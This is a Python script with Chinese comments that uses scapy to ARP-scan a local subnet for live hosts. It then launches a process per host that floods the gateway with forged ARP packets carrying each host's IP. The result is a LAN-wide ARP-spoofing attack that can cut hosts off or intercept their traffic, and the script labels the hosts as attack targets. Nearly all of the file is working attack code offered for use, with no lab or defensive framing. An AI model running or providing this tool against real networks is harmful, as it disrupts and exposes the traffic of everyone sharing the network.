# -*- coding: utf-8 -*-
import time,multiprocessing
from scapy.all import *

def scan(ip_c):#扫描局域网

    IpScan = ip_c + '.0/24'
    try:
        # 使用Ether()/ARP()构造ARP包
        packet = Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=IpScan)
        # srp():发送与接收ARP包,返回一个元组。元组的第一个元素就是收到的数据包，第二个指未收到的包
        ans, _ = srp(packet, timeout=2)
    except Exception as e:
        print(e)
    else:
        # 解析获取的包的信息，得到局域网中存活的主机的IP地址和MAC地址
        return ans
        #for _, rcv in ans:
        #    #        ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")
        #    #        print(ListMACAddr)
        #    print(rcv[ARP].psrc)

def send(tagrt,host):#发包函数
    #构造包
    #pdst是目标IP，psrc是网关的ip
    pkt=ARP(psrc=tagrt ,pdst=host,op=1)
    srloop(pkt)


def main():

    ip_c = input('输入网段:\n')
    iplist = scan(ip_c)
    ip_t = []
    print('局域网存活主机------------------------------')
    for _, rcv in iplist:
        ip_t.append(rcv[ARP].psrc)
        print(rcv[ARP].psrc)
    ip_host = input('输入网关:\n')
    if_t = input('是否开启白名单? YES or NO\n')

    if (if_t=='YES' or if_t=='yes'):
        try:
            for line in open('./Whitelist.txt'):
                ip_t.remove(line.strip('\n'))
        except:
            print('白名单出错了')
    if (if_t=='NO' or 'no'):
        pass

    ip_t.remove(ip_host)


    print('攻击目标---------------------------5s后开始')
    for ip in ip_t:
        print(ip)
        P = multiprocessing.Process(target=send,args=(ip,ip_host))
        P.start()
        time.sleep(0.1)

    # print(output)
    # srloop(pkt)

if __name__ == '__main__':
    main()